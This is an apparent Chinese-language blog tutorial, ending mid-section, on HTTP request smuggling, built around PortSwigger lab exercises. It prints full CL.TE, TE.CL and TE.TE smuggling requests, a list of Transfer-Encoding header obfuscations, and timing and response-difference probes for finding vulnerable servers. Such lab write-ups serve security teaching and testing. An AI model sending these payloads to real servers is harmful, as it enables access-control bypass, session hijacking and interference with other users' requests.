@@ -1,0 +1,723 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xiaobite">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="01前言HTTP Request Smuggling (HTTP 请求走私) 是一种攻击，利用了 HTTP 协议中存在的不一致性和漏洞。攻击者通过发送特殊构造的 HTTP 请求，欺骗代理服务器、负载均衡器或者 Web 服务器等中间节点，绕过安全控制，实现攻击目标。HTTP 请求走私攻击可以导致多种安全问题，包括但不限于数据泄露、访问控制绕过、会话劫持、跨站点脚本攻击（XSS）等。为防止 HTTP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP Request Smuggling（HTTP 请求走私）">
+<meta property="og:url" content="https://xiaobite-hacker.github.io/2024/02/01/HTTP-Request-Smuggling%EF%BC%88HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%EF%BC%89/index.html">
+<meta property="og:site_name" content="xiaobite">
+<meta property="og:description" content="01前言HTTP Request Smuggling (HTTP 请求走私) 是一种攻击，利用了 HTTP 协议中存在的不一致性和漏洞。攻击者通过发送特殊构造的 HTTP 请求，欺骗代理服务器、负载均衡器或者 Web 服务器等中间节点，绕过安全控制，实现攻击目标。HTTP 请求走私攻击可以导致多种安全问题，包括但不限于数据泄露、访问控制绕过、会话劫持、跨站点脚本攻击（XSS）等。为防止 HTTP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045215.png">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045233.png">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045311.png">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045326.png">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045340.png">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045357.png">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045420.png">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045445.png">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045509.png">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045549.png">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045608.png">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045644.png">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045701.png">
+<meta property="og:image" content="https://xiaobite-hacker.github.io/img/20240201045730.png">
+<meta property="article:published_time" content="2024-01-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-18T11:41:39.059Z">
+<meta property="article:author" content="xiaobite">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xiaobite-hacker.github.io/img/20240201045215.png">
+  
+  
+  
+  <title>HTTP Request Smuggling（HTTP 请求走私） - xiaobite</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xiaobite-hacker.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xiaobite</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/prompt/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>prompt</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTTP Request Smuggling（HTTP 请求走私）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-01 00:00" pubdate>
+          2024年2月1日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTTP Request Smuggling（HTTP 请求走私）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="01前言"><a href="#01前言" class="headerlink" title="01前言"></a>01前言</h2><p>HTTP Request Smuggling (HTTP 请求走私) 是一种攻击，利用了 HTTP 协议中存在的不一致性和漏洞。攻击者通过发送特殊构造的 HTTP 请求，欺骗代理服务器、负载均衡器或者 Web 服务器等中间节点，绕过安全控制，实现攻击目标。HTTP 请求走私攻击可以导致多种安全问题，包括但不限于数据泄露、访问控制绕过、会话劫持、跨站点脚本攻击（XSS）等。为防止 HTTP 请求走私攻击，应该合理配置 Web 服务器和代理服务器，以及严格遵循规范，尽可能避免使用不受支持的协议特性。</p>
+<h2 id="02前置知识"><a href="#02前置知识" class="headerlink" title="02前置知识"></a>02前置知识</h2><ol>
+<li><p><strong>TE（Transfer-Encoding）</strong>：HTTP协议中的一个消息头（header），它用于指定HTTP请求或响应中消息体的编码方式，以便接收方能够正确地接收和处理消息。在使用Transfer-Encoding时，消息体的编码方式需要指定，而不是使用Content-Length来指定消息体的大小。</p>
+</li>
+<li><p><strong>CL（Content-Length）</strong>：HTTP协议中的一个消息头（header），它用于指定HTTP请求或响应中消息体的大小，以便接收方能够正确地接收和处理消息。需要注意的是，在使用Content-Length时，消息体的长度必须要精确指定。</p>
+</li>
+<li><p><strong>分块传输</strong>：当服务器无法确定响应的大小时，如动态生成的响应或者通过流式传输时，可以使用Transfer-Encoding来实现分块传输（0就是截断）。</p>
+</li>
+<li><p><strong>关于HTTP1.1</strong>：这个版本默认开始了 Connection: Keep-alive 特性，作用是告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。</p>
+</li>
+</ol>
+<h2 id="03原理"><a href="#03原理" class="headerlink" title="03原理"></a>03原理</h2><p>一般是后端和前端对于请求的结束认证不一致导致的，相当于后端对于第一个包产生了截断，前者正常处理，后者就会和第二个包进行拼接，这样就对第二个包造成了影响。</p>
+<p><img src="/../img/20240201045215.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="04分类"><a href="#04分类" class="headerlink" title="04分类"></a>04分类</h2><p>接下来将通过对 Burpsuite 请求走私基础靶场 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#http-request-smuggling">Portswigger</a> 了解请求走私。<br>首先先将自动更新Content-Length去掉</p>
+<p><img src="/../img/20240201045233.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="CL-TE请求走私"><a href="#CL-TE请求走私" class="headerlink" title="CL:TE请求走私"></a>CL:TE请求走私</h3><h4 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h4><p>前端服务器只处理 Content-Length 请求头，后端处理 Transfer-Encoding 请求头。</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">测试靶场地址</a></p>
+<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>开启抓包，转换为POST请求，构造请求如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>0a84004b03b3406186a47fee001a0067.web-security-academy.net<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=Iru5SUPaysiJuyDcCrVsCbkHufebQQ9Z<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>6<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-css"><span class="hljs-number">0</span></span><br><span class="language-css"></span><br><span class="language-css"><span class="hljs-attribute">Y</span></span><br></code></pre></td></tr></table></figure>
+
+<p>第一次发送数据包，页面正常返回：</p>
+<p><img src="/../img/20240201045311.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二次发送数据包，前端服务器根据 Content-Length 字段处理，所以从请求体body 0到Y结束（&#x2F;r&#x2F;n 算一个）总和是6，所以前端没什么问题，而后端因为根据 Transfer-Encoding 头来处理，第一次请求的时候它看到了为0的结束块，服务端认为第一个包到0结束，而剩下可以想象还在TCP链上，第二个数据包过来了，它们就合并到了一块。</p>
+<p><img src="/../img/20240201045326.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/../img/20240201045340.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以第二次服务端收到的数据包如下：</p>
+<p><img src="/../img/20240201045357.png" srcset="/img/loading.gif" lazyload></p>
+<p>坑点，这里一定要是HTTP&#x2F;1.1，请求如果是HTTP&#x2F;2的请求走私需要去另外了解</p>
+<p><img src="/../img/20240201045420.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="TE-CL请求走私"><a href="#TE-CL请求走私" class="headerlink" title="TE:CL请求走私"></a>TE:CL请求走私</h3><h4 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h4><p>前端服务器只处理 Transfer-Encoding 请求头，后端处理 Content-Length 请求头。</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">测试靶场地址</a></p>
+<h4 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h4><p>理论上来说这个和上面的CL:TE反过来就行了，构造数据包：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>0a0a00a404901ccc81ceed5a009800c9.web-security-academy.net<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=ndhAxLAN9wQOf7BYbQACPY8FPJxYWigS<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>4<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">5</span>c</span><br><span class="language-nix">GPOST <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span></span><br><span class="language-nix"><span class="hljs-params">Content-Length:</span> <span class="hljs-number">15</span></span><br><span class="language-nix"></span><br><span class="language-nix"><span class="hljs-attr">x</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></span><br><span class="language-nix"><span class="hljs-number">0</span></span><br></code></pre></td></tr></table></figure>
+
+<p>第一次发送数据包，页面正常返回：</p>
+<p><img src="/../img/20240201045445.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二次发送数据包，由于前端服务器处理 Transfer-Encoding，当其读取到 0\r\n\r\n 时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理 Content-Length 请求头，当它读取完 5c\r\n 之后，就认为这个请求已经结束了，后面的数据（红色框）就认为是另一个请求了。</p>
+<p><img src="/../img/20240201045509.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="TE-TE请求走私"><a href="#TE-TE请求走私" class="headerlink" title="TE:TE请求走私"></a>TE:TE请求走私</h3><h4 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h4><p>TE-TE，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理 Transfer-Encoding 请求头，这确实是实现了 RFC 的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的Transfer-Encoding进行某种混淆操作，从而使其中一个服务器不处理Transfer-Encoding请求头。</p>
+<p>从某种意义上还是 CL-TE 或者 TE-CL。</p>
+<p>混淆 Transfer-Encoding 头的方式可能无穷无尽。例如：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Transfer-Encoding:</span> xchunked<br><span class="hljs-params">Transfer-Encoding :</span> chunked<br><span class="hljs-params">Transfer-Encoding:</span> chunked<br><span class="hljs-params">Transfer-Encoding:</span> x<br>Transfer-Encoding:[tab]chunked<br>[space]<span class="hljs-params">Transfer-Encoding:</span> chunked<br><span class="hljs-params">X:</span> X[ \n]<span class="hljs-params">Transfer-Encoding:</span> chunked<br><span class="hljs-params">Transfer-Encoding:</span> chunked<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">测试靶场地址</a></p>
+<h4 id="利用过程-2"><a href="#利用过程-2" class="headerlink" title="利用过程"></a>利用过程</h4><p>数据包：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>0a96002104b1252f80e32b240005002a.web-security-academy.net<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=1XbK2bBnAanbk4Yd2afcp8xGxZFRwAUJ<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-length</span><span class="hljs-punctuation">: </span>4<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Transfer-encoding</span><span class="hljs-punctuation">: </span>cow<br><br><span class="language-nix"><span class="hljs-number">5</span>c</span><br><span class="language-nix">YPOST <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span></span><br><span class="language-nix"><span class="hljs-params">Content-Length:</span> <span class="hljs-number">15</span></span><br><span class="language-nix"></span><br><span class="language-nix"><span class="hljs-attr">x</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></span><br><span class="language-nix"><span class="hljs-number">0</span></span><br></code></pre></td></tr></table></figure>
+
+<p>第一次发送数据包，页面正常返回：</p>
+<p><img src="/../img/20240201045549.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二次发送数据包，根据混淆诱导不处理 Transfer-Encoding 的是前端服务器（转发服务）还是后端服务，之后的攻击方式则与 CL.TE 或 TE.CL 漏洞相同。</p>
+<p><img src="/../img/20240201045608.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="05漏洞检测"><a href="#05漏洞检测" class="headerlink" title="05漏洞检测"></a>05漏洞检测</h2><h3 id="计时技术"><a href="#计时技术" class="headerlink" title="计时技术"></a>计时技术</h3><h4 id="利用计时技术发现CL-TE漏洞"><a href="#利用计时技术发现CL-TE漏洞" class="headerlink" title="利用计时技术发现CL.TE漏洞"></a>利用计时技术发现CL.TE漏洞</h4><p>当同时存在CL头和TE头时，如果请求包正文的长度大于CL头指定的长度，则会导致请求包只有CL头指定长度内的内容，从而导致后端服务器因为采用TE头处理而一直等待后续请求包，最终会导致超时，故可以证明存在CL.TE漏洞，例如：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>4<br><br><span class="language-css"><span class="hljs-number">1</span></span><br><span class="language-css"><span class="hljs-selector-tag">A</span></span><br><span class="language-css"><span class="hljs-attribute">X</span></span><br></code></pre></td></tr></table></figure>
+
+<h4 id="利用计时技术发现TE-CL漏洞"><a href="#利用计时技术发现TE-CL漏洞" class="headerlink" title="利用计时技术发现TE.CL漏洞"></a>利用计时技术发现TE.CL漏洞</h4><p>这种漏洞也是，开始就遇到 0\r\n\r\n（表示结束），直接把 X 丢弃，然后将数据包发送给后端，后端用的是CL，要6个字节长度内容才会终止，等不到就一直等，直到响应超时，则可以证明存在TE.CL漏洞，例如：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>6<br><br><span class="language-css"><span class="hljs-number">0</span></span><br><span class="language-css"></span><br><span class="language-css"><span class="hljs-attribute">X</span></span><br></code></pre></td></tr></table></figure>
+
+<p>值得注意的是如果应用程序可能受到CL.TE攻击，那么针对TE.CL漏洞的利用计时技术的测试可能会干扰其他应用程序用户。因此，要保持隐蔽并最大程度地减少超时现象，应该首先使用CL.TE测试，只有在第一次测试不成功时才继续进行TE.CL测试。</p>
+<h3 id="响应差异"><a href="#响应差异" class="headerlink" title="响应差异"></a>响应差异</h3><p>发送两次请求，第一个是魔改的请求包，第二个是正常的请求，这样就能用第一个请求干扰后端服务器对第二个请求包的处理。</p>
+<h4 id="利用响应差异确认CL-TE漏洞"><a href="#利用响应差异确认CL-TE漏洞" class="headerlink" title="利用响应差异确认CL.TE漏洞"></a>利用响应差异确认CL.TE漏洞</h4><p>因为是CL.TE，所以在第一个请求包结束以后加入一个空行再开始编写第二个请求包，像这样：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/search</span><br>HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> vulnerable-website.com<br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><span class="hljs-params">Content-Length:</span> <span class="hljs-number">49</span><br><span class="hljs-params">Transfer-Encoding:</span> chunked<br><br>e<br>q<span class="hljs-operator">=</span>smuggling &amp;x<span class="hljs-operator">=</span><br><span class="hljs-number">0</span><br><br>GET <span class="hljs-symbol">/404</span> HTTP<span class="hljs-symbol">/1.1</span> <br><span class="hljs-params">Foo:</span> x<br></code></pre></td></tr></table></figure>
+
+<p>第一次发送这个请求包会因为后端服务器利用TE头处理而将第二个请求包作为单独的请求包处理，但是第二个请求包又不完整，所以会等待后续的请求包，当第二次发送请求后会将上一次的剩余的请求头与这一次请求包合并起来处理，此时会接收到异常的响应，就能判断存在CL.TE漏洞，像这样：</p>
